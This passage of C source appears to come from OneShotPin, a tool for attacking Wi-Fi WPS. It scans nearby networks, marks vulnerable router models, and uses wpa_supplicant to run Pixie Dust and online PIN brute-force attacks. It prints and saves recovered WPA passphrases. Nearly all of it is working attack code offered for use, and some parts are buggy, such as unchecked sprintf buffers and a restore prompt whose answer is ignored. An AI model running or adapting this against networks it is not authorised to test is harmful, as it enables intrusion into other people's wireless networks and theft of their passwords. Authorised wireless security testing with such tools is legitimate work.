	sprintf(input,"WPS_REG %s %08u",mac2str(bssid),pin);
	char output[256];
	wpa_ctrl_send_recv(&data->ctrl,input,output,256);
	if(strstr(output,"OK")==NULL){
		data->connection_status.status=STATUS_WPS_FAIL;
		if(strstr(output,"UNKNOWN COMMAND"))
			fprintf(stderr,"[!] It looks like your wpa_supplicant is "
			       "compiled without WPS protocol support. "
			       "Please build wpa_supplicant with WPS "
			       "support (\"CONFIG_WPS=y\")\n");
		else
			fprintf(stderr,"[!] Something went wrong — check out debug log\n");
		return;
	}
	while(1){
		int res=handle_wpas(data,pixiemode,bssid);
		if(res)
			break;
		if(data->connection_status.status==STATUS_WPS_FAIL)
			break;
		if(data->connection_status.status==STATUS_GOT_PSK)
			break;
		if(data->connection_status.status==STATUS_WSC_NACK)
			break;
	}
	wpa_ctrl_send(&data->ctrl,"WPS_CANCEL");
}
void single_connection(data_t *data,mac_t bssid,pin_t pin,int pixiemode,
			int showpixiesmd,int pixieforce){
	if(pin==NO_PIN){
		if(pixiemode){
			/* Try using the previously calculated PIN */
			pin_t loaded_pin=load_pin(data,bssid);
			if(loaded_pin!=NO_PIN){
				printf("[?] Use previously calculated PIN %08u? [n/Y] ",pin);
				int input=getc(stdin);
				if(input=='y' || input=='Y')
					pin=loaded_pin;
			}
			if(pin==NO_PIN)
				pin=get_likely(bssid);
			if(pin==NO_PIN)
				pin=12345670;
		}else{
			pin=prompt_wpspin(bssid);
			if(pin==NO_PIN)
				pin=12345670;
		}
	}
	wps_connection(data,bssid,pin,pixiemode);
	if(data->connection_status.status==STATUS_GOT_PSK){
		credential_print(pin,data->connection_status.wpa_psk,
		                     data->connection_status.essid);
		if(data->save_result)
			save_result(data,bssid,
			            data->connection_status.essid,pin,
			            data->connection_status.wpa_psk);
		char pin_path[128];
		sprintf(pin_path,"%s/%017llu.run",data->pixiewps_dir,bssid);
		remove(pin_path);
	}else if(pixiemode){
		if(got_all_pixieps_data(&data->pixiewps_data)){
			pin=run_pixiwps(&data->pixiewps_data,showpixiesmd,pixieforce);
			if(pin!=NO_PIN)
				return single_connection(data,bssid,pin,
						0,showpixiesmd,pixieforce);

		}else
			fprintf(stderr,"[!] Not enough data to run Pixie Dust attack\n");
	}

}
void delay_ms(int ms){
    clock_t start_time = clock();
    while (clock() < start_time + ms);
}
pin_t first_half_bruteforce(data_t *data,mac_t bssid,pin_t f_half,int delay){
	while(f_half<10000){
		pin_t pin=f_half*10000+checksum(f_half*10000);
		single_connection(data,bssid,pin,0,0,0);
		if(data->connection_status.last_m_message>5){
			printf("[+] First half found\n");
			return f_half;
		}else if(data->connection_status.status==STATUS_WPS_FAIL){
			fprintf(stderr,"[!] WPS transaction failed, re-trying last pin");
			return first_half_bruteforce(data,bssid,f_half,delay);
		}
		f_half++;
		register_bruteforce_attempt(&data->bruteforce,f_half);
		delay_ms(delay*1000);
	}
	fprintf(stderr,"[-] First half not found\n");
	return NO_PIN;
}
pin_t second_half_bruteforce(data_t *data,mac_t bssid,pin_t f_half,pin_t s_half,int delay){
	while(s_half<1000){
		pin_t t=f_half*1000+s_half;
		pin_t pin=t*10+checksum(t);
		single_connection(data,bssid,pin,0,0,0);
		if(data->connection_status.last_m_message>6)
			return pin;
		else if(data->connection_status.status==STATUS_WPS_FAIL){
			fprintf(stderr,"[!] WPS transaction failed, re-trying last pin\n");
			return second_half_bruteforce(data, bssid, f_half, s_half, delay);
		}
		s_half++;
		register_bruteforce_attempt(&data->bruteforce,t);
		delay_ms(delay*1000);
	}
	return NO_PIN;
}
void smart_bruteforce(data_t *data,mac_t bssid,pin_t start_pin,int delay){
	pin_t mask=0;
	if(start_pin==NO_PIN || start_pin<10000){
		pin_t loaded=load_pin(data,bssid);
		if(loaded!=NO_PIN){
			printf("[?] Restore previous session for %s? [n/Y] ",mac2str(bssid));
			int input=getc(stdin);
			mask=loaded;
		}
	}else
		mask=start_pin/10;

	data->bruteforce=(bruteforce_status_t){0};
	data->bruteforce.mask=mask;
	data->bruteforce.start_time=time(NULL);
	data->bruteforce.last_attempt_time=time(NULL);

	if(mask>=10000){
		pin_t f_half=mask/1000;
		pin_t s_half=mask%1000;
		second_half_bruteforce(data,bssid,f_half,s_half,delay);
	}else{
		pin_t f_half=first_half_bruteforce(data,bssid,mask,delay);
		if(f_half!=NO_PIN && data->connection_status.status!=STATUS_GOT_PSK)
			second_half_bruteforce(data,bssid,f_half,1,delay);
	}
}
void quit(data_t *data){
	wpa_ctrl_close(&data->ctrl);
	pclose(data->wpas);
	remove(data->ctrl.tempdir);
	remove(data->ctrl.tempcfg);
}
typedef struct {
	time_t time;
	mac_t bssid;
	char essid[256];
	pin_t pin;
	char psk[256];
} network_entry_t;

network_entry_t read_csv_str(char *str) {
	network_entry_t network;
	char *last=NULL;
	int index=0;
	while(*str) {
		if(last && *str=='"') {
			char c=*str;
			*str='\0';
			switch(index++) {
			case 0: {
				int month;
				struct tm time;
				sscanf(last,"%2d.%2d.%4d %2d:%2d",
				       &time.tm_year,
				       &month,
					   &time.tm_mday,
				       &time.tm_hour,
				       &time.tm_min);
				time.tm_mon=month-1;
				network.time=mktime(&time);
			}
			break;
			case 1:
				network.bssid=str2mac(last);
				break;
			case 2:
				strcpy(network.essid,last);
				break;
			case 3:
				sscanf(last,"%8u",&network.pin);
				break;
			case 4:
				strcpy(network.psk,last);
				break;
			}
			last=NULL;
			*str=c;
		} else if(!last && *str=='"')
			last=str+1;
		str++;
	}
	return network;
}
network_entry_t *read_csv(const char *path,size_t *count) {
	FILE *file=fopen(path,"r");
	if(!file)return NULL;

	size_t lines=count_lines(file);

	network_entry_t *networks=(network_entry_t*)malloc(sizeof(network_entry_t)*(lines-1));
	unsigned int l;
	for(l=0; l<lines; l++) {
		char str[1024];
		fgets(str,1024,file);
		if(l!=0 && *str!='\0')
			networks[l-1]=read_csv_str(str);
	}

	fclose(file);
	if(count)
		*count=lines-1;
	return networks;
}

enum {
	SECURITY_OPEN,
	SECURITY_WEP,
	SECURITY_WPA,
	SECURITY_WPA2,
	SECURITY_WPA_WPA2,
};
typedef struct {
	mac_t bssid;
	char essid[256];
	int signal;
	int security;
	int wps;
	int wps_locked;
	char model[256];
	char model_number[256];
	char device_name[256];
} network_info_t;

int compare_network_info(const void *n1, const void *n2) {
	return ((const network_info_t*)n2)->signal-((const network_info_t*)n1)->signal;
}
mac_t scan_wifi(const char *interface, char **vuln_list,int reverse_scan) {
	char reports_path[256];
	sprintf(reports_path,"%s/reports/stored.csv",get_oneshot_dir());
	size_t saves_count;
	network_entry_t *saves=read_csv(reports_path,&saves_count);

	char smd[64];
	snprintf(smd,64,"iw dev %s scan 2>&1",interface);

	/* parse iw output */
	FILE *output=popen(smd,"r");

	network_info_t scanned[100];
	network_info_t *network=scanned-1;

	int network_count=0;

	while(!feof(output)) {
		char buf[1024];
		fgets(buf,1024,output);
		char *str=buf;
		while(*str=='\t' || *str==' ')str++;
		if(strstr(str,"command failed:")) {
			fprintf(stderr,"[!] Error: %s",str);
			return NO_MAC;
		} else if(strstr(str,"(on")) {
			network++;
			network_count++;
			char bssid_str[18];
			sscanf(str,"BSS %17s",bssid_str);
			network->bssid=str2mac(bssid_str);
		} else if(strstr(str,"SSID"))
			sscanf(str,"SSID: %[^\n]s",network->essid);
		else if(strstr(str,"signal"))
			sscanf(str,"signal: %d dBm",&network->signal);
		else if(strstr(str,"capability")) {
			if(strstr(str,"Privacy"))
				network->security=SECURITY_WEP;
			else
				network->security=SECURITY_OPEN;
		} else if(strstr(str,"RSN")) {
			if(network->security==SECURITY_WEP)
				network->security=SECURITY_WPA2;
			else if(network->security==SECURITY_WPA)
				network->security=SECURITY_WPA_WPA2;
		} else if(strstr(str,"WPA")) {
			if(network->security==SECURITY_WEP)
				network->security=SECURITY_WPA;
			else if(network->security==SECURITY_WPA2)
				network->security=SECURITY_WPA_WPA2;
		} else if(strstr(str,"setup"))
			sscanf(str,"* AP setup locked: 0x%x",&network->wps_locked);
		else if(strstr(buf,"Model:"))
			sscanf(str,"* Model: %[^\n]s",network->model);
		else if(strstr(str,"Model Number:"))
			sscanf(str,"* Model Number: %[^\n]s",network->model_number);
		else if(strstr(str,"Device name:"))
			sscanf(str,"* Device name: %[^\n]s",network->device_name);
	}
	pclose(output);

	qsort(scanned,network_count,sizeof(network_info_t),compare_network_info);

	if(network_count) {
		const char *red=	"\033[91m";
		const char *green=	"\033[92m";
		const char *yellow=	"\033[93m";
		const char *clear=	"\033[0m";
		if(vuln_list)
			printf("Network marks: "
				   "%sPossibly vulnerable%s | "
				   "%sWPS locked%s | "
				   "%sAlready stored%s\n",
				   green,clear,red,clear,yellow,clear);
		printf("Network list:\n");
		printf("%-4s %-18s %-25s %-8s %-4s %-27s %s\n",
			   "#", "BSSID", "ESSID", "Sec.", "PWR", "WSC device name", "WSC model");

		int i=0;
		if(reverse_scan)
			i=network_count-1;
		while(i!=(reverse_scan?0:network_count-1)) {
			network_info_t *network=scanned+i;
			const char *security;
			switch(network->security) {
			case SECURITY_OPEN:
				security="Open";
				break;
			case SECURITY_WEP:
				security="WEP";
				break;
			case SECURITY_WPA:
				security="WPA";
				break;
			case SECURITY_WPA2:
				security="WPA2";
				break;
			case SECURITY_WPA_WPA2:
				security="WPA/WPA2";
				break;
			}
			char model[256];
			char number[5];
			sprintf(model,"%s %s",network->model,network->model_number);

			sprintf(number,"%d)",i+1);

			int stored=0;
			int vulnerable=0;
			if(saves) {
				unsigned int i;
				for(i=0; i<saves_count; i++) {
					if(network->bssid==saves[i].bssid &&
						    strcmp(network->essid,saves[i].essid)==0) {
						stored=1;
						break;
					}
				}
			}
			if(!stored && vuln_list && !network->wps_locked) {
				char **p;
				for(p=vuln_list; *p; p++) {
					if(strcmp(model,*p)==0) {
						vulnerable=1;
						break;
					}
				}
			}
			if(stored)
				printf("%s",yellow);
			else if(network->wps_locked)
				printf("%s",red);
			else if(vulnerable)
				printf("%s",green);

			printf("%-4s %-18s %-25s %-8s %-4d %-27s %s %s\n",
				   number,mac2str(network->bssid),network->essid,security,network->signal,
				   network->device_name,model,clear);
			if(reverse_scan)
				i--;
			else
				i++;
		}
		free(saves);
		while(1) {
			char input[8];
			int number;
			printf("Select target (press Enter to refresh): ");
			fgets(input,8,stdin);
			if(*input=='\n' || *input=='r' || *input=='R')
				return scan_wifi(interface,vuln_list,reverse_scan);
			else if(sscanf(input,"%d",&number)!=1 ||
					number<1 || number>network_count)
				fprintf(stderr,"Invalid number\n");
			else
				return scanned[number-1].bssid;
		}
	} else
		fprintf(stderr,"[-] No WPS networks found.\n");
	free(saves);
	return NO_MAC;
}
char **read_vuln_list(const char *path) {
	FILE* file=fopen(path,"r");
	if(!file)return NULL;

	size_t lines=count_lines(file);

	char **strings=(char**)malloc(sizeof(char*)*(lines+1));
	strings[lines]=NULL;
	unsigned int line;
	for(line=0; line<lines; line++) {
		strings[line]=(char*)malloc(1024);
		fgets(strings[line],1024,file);
		char *p;
		for(p=strings[line]; *p; p++)
			if(*p=='\n')
				*p='\0';
	}
	fclose(file);

	return strings;
}

typedef struct {
	const char *interface;
	mac_t bssid;
	unsigned int pin;
	int pixie_dust;
	int pixie_force;
	int bruteforce;
	int show_pixie_smd;
	unsigned int delay;
	int write;
	int iface_down;
	int verbose;
	int mtk_fix;
	const char *vuln_list_path;
	int loop;
	int reverse_scan;
} input_t;

void default_input(input_t *input) {
	input->interface=NULL;
	input->bssid=NO_MAC;
	input->pin=-1;
	input->pixie_dust=0;
	input->pixie_force=0;
	input->bruteforce=0;
	input->show_pixie_smd=0;
	input->delay=0;
	input->write=0;
	input->iface_down=0;
	input->verbose=0;
	input->mtk_fix=0;
	input->loop=0;
	input->reverse_scan=0;
	input->vuln_list_path="vulnwsc.txt";
}
enum {
	MODE_DOWN,
	MODE_UP
};
int interface_set(const char *interface, int up) {
	char str[128];
	snprintf(str,128,"ip link set %s %s",
	         interface,(up?"up":"down"));
	return system(str);
}
void print_help() {
	printf(
		"OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg\n"
		"oneshot <arguments>\n\n"

		"Required arguments:\n"
		"    -i, --interface=<wlan0>  : Name of the interface to use\n\n"

		"Optional arguments:\n"
		"    -b, --bssid=<mac>        : BSSID of the target AP\n"
		"    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)\n"
		"    -K, --pixie-dust         : Run Pixie Dust attack\n"
		"    -B, --bruteforce         : Run online bruteforce attack\n\n"

		"Advanced arguments:\n"
		"    -d, --delay=<n>          : Set the delay between pin attempts [0]\n"
		"    -w, --write              : Write AP credentials to the file on success\n"
		"    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)\n"
		"    -X, --show-pixie-cmd     : Always print Pixiewps command\n"
		"    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']\n"
		"    --iface-down             : Down network interface when the work is finished\n"
		"    -l, --loop               : Run in a loop\n"
		"    -v, --verbose            : Verbose output\n"
		"    -m, --mtk-fix            : MTK interface fix, turn off Wi-Fi to use this\n"
		"    -r, --reverse-scan       : Reverse sorting of networks in the scan. Useful on small displays\n\n"

		"Example:\n"
		"    oneshot -i wlan0 -b 00:90:4C:C1:AC:21 -K\n"
	);
}
int main(int argc, char **argv) {
	if(getuid()!=0) {
		fprintf(stderr,"Run it as root\n");
		return -1;
	}
	enum {
		OPT_IFACE_DOWN=CHAR_MAX+1,
		OPT_VULN_LIST
	};
	const char * short_options = "i:b:p:d:KFBXwvlrmh";
	const struct option long_options [] = {
		{"interface",		required_argument,	NULL,'i'},
		{"bssid",			required_argument,	NULL,'b'},
		{"pin",				required_argument,	NULL,'p'},
		{"delay",			required_argument,	NULL,'d'},
		{"pixie-dust",		no_argument,		NULL,'K'},
		{"pixie-force",		no_argument,		NULL,'F'},
		{"bruteforce",		no_argument,		NULL,'B'},
		{"show-pixie-smd",	no_argument,		NULL,'X'},
		{"write",			no_argument,		NULL,'w'},
		{"verbose",			no_argument,		NULL,'v'},
		{"loop",			no_argument,		NULL,'l'},
		{"reverse-scan",	no_argument,		NULL,'r'},
		{"iface-down",		no_argument,		NULL,OPT_IFACE_DOWN},
		{"mtk-fix",			no_argument,		NULL,'m'},
		{"vuln-list",		required_argument,	NULL,OPT_VULN_LIST},
		{"help",			no_argument,		NULL,'h'},
		{NULL, 0, NULL, 0}
	};

	input_t input;
	default_input(&input);

	int option;
	int option_index;
	while((option=getopt_long(argc,argv,short_options,long_options,&option_index))!=-1) {
		switch(option) {
		case 'i':
			input.interface=optarg;
			break;
		case 'b':
			input.bssid=str2mac(optarg);
			if(input.bssid==NO_MAC) {
				fprintf(stderr,"ERROR: invalid mac adress");
				return -1;
			}
			break;
		case 'p':
			if(sscanf(optarg,"%u",&input.pin)!=1 || input.pin>99999999) {
				fprintf(stderr,"ERROR: invalid pin\n");
				return -1;
			}
			break;
		case 'd':
			if(sscanf(optarg,"%u",&input.delay)!=1) {
				fprintf(stderr,"ERROR: invalid delay value\n");
				return -1;
			}
			break;
		case 'K':
			input.pixie_dust=1;
			break;
		case 'F':
			input.pixie_force=1;
			break;
		case 'B':
			input.bruteforce=1;
			break;
		case 'X':
			input.show_pixie_smd=1;
			break;
		case 'w':
			input.write=1;
			break;
		case 'v':
			input.verbose=1;
			break;
		case 'l':
			input.loop=1;
			break;
		case 'r':
			input.reverse_scan=1;
			break;
		case OPT_VULN_LIST:
			input.vuln_list_path=optarg;
			break;
		case OPT_IFACE_DOWN:
			input.iface_down=1;
			break;
		case 'm':
			input.mtk_fix=1;
			break;
		case 'h':
			print_help();
			return -1;
		}
	}
	if(input.interface==NULL) {
		print_help();
		return -1;
	}
	if(input.mtk_fix) {
		chmod("/dev/wmtWifi", 0644);
		FILE *f = fopen("/dev/wmtWifi", "w");
		fputc("1", f);
		fclose(f);
	}
		
		
	if(interface_set(input.interface,MODE_UP)) {
		fprintf(stderr,"Unable to up interface %s\n",input.interface);
		return -1;
	}

	char **vuln_list=read_vuln_list(input.vuln_list_path);

	do {
		if(input.bssid==NO_MAC) {
			if(!input.loop)
				printf("[*] BSSID not specified (--bssid) — scanning for available networks\n");
			input.bssid=scan_wifi(input.interface,vuln_list,input.reverse_scan);
		}
		if(input.bssid!=NO_MAC) {
			data_t data;
			init(&data,input.interface,input.write,input.verbose);
			if(input.bruteforce)
				smart_bruteforce(&data,input.bssid,input.pin,input.delay);
			else
				single_connection(&data,input.bssid,input.pin,input.pixie_dust,
								input.show_pixie_smd,input.pixie_force);
		}
		input.bssid=NO_MAC;
	} while(input.loop);

	if(input.iface_down)
		interface_set(input.interface,MODE_DOWN);
	if(vuln_list) {
		char **p;
		for(p=vuln_list; *p; p++)
			free(*p);
		free(vuln_list);
	}
	return 0;
}
